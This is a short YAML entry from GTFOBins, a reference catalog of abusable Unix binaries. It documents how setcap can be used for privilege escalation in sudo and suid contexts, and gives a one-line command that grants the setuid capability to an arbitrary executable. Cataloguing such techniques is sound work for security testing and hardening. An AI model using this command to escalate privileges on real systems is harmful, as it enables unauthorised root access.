<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/setcap -->
---
functions:
  privilege-escalation:
  - code: |-
      setcap cap_setuid+ep /path/to/command
    comment: |-
      This can be used to assign capabilities to executable files.
    contexts:
      sudo:
      suid:
...
